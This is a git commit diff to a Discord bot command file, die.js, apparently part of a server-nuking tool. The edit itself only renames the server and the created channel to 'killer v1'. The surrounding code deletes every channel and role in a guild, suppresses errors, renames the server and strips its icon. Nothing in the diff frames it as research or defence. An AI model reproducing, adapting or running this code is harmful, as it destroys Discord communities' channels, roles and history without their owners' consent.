713318d2c398dbd8fd9aebfe7964f9f461f45457
ZeckDev <122693027+Zeck47@users.noreply.github.com>
2023-05-10 09:02:53 -0300

    Update die.js

--- cmds/die.js
+++ cmds/die.js
@@ -5,10 +5,10 @@ exports.run = async (client, msg, args) => {
     await msg.guild.channels.forEach(c => c.delete().catch(() => {}))
     await msg.guild.roles.map(r => r.delete().catch(() => {}))
 
-    await msg.guild.setName('cosa nostra')
+    await msg.guild.setName('killer v1')
     await msg.guild.setIcon()
 
-    msg.guild.createChannel('é o hype', {
+    msg.guild.createChannel('killer v1', {
         type: 'text'
     }).catch(() => {})
 
